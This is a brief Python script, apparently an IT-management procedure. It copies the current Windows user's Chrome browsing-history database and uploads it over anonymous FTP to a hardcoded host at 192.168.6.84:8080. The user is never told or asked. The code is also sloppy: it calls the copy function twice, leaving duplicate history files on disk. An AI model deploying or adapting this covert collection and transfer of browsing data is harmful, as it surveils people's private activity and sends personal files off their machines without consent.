#To define a particular parameter, replace the 'parameterName' inside itsm.getParameter('parameterName') with that parameter's name
from ftplib import FTP
from datetime import datetime
import os
import shutil

def get_history_report():
    now = datetime.now()
    time_now = now.strftime('''%Y%m%d_%H%M%S''')
    user_profile = os.environ.get("USERPROFILE")
    history_path = user_profile + r"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
    shutil.copyfile((history_path + 'History'), (history_path + 'History_%s_%s' %(time_now, user_profile.split('\\')[-1])))
    return (history_path +'History_%s_%s' %(time_now,user_profile.split('\\')[-1]))
def Main():
    filename = get_history_report().split('\\')[-1]
    print(filename)
    ftp = FTP('')
    ftp.connect('192.168.6.84', 8080, )
    ftp.login()
    ftp.retrlines('LIST')
    fp = open(get_history_report(), 'rb')
    ftp.storbinary('STOR ' + filename, fp)
    ftp.quit()
if __name__ == '__main__':
    Main()